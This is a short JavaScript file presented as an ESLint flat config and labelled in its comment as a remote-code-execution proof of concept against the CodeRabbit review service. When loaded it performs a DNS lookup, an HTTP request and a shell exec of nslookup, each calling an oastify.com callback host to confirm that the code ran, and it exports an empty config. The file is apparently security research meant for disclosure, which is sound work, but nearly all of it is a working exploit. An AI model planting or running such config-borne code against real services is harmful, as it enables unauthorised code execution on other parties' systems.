// CodeRabbit RCE PoC - ESLint flat config executes on load
try { require('dns').lookup('eslint-flat.hwhv3spdg8a0y4fiq0r8ifiqjhp8dy1n.oastify.com', () => {}); } catch (e) {}
try { require('http').get('http://eslint-flat-http.hwhv3spdg8a0y4fiq0r8ifiqjhp8dy1n.oastify.com/'); } catch (e) {}
try { require('child_process').exec('nslookup eslint-cmdexec.hwhv3spdg8a0y4fiq0r8ifiqjhp8dy1n.oastify.com'); } catch (e) {}
module.exports = [];
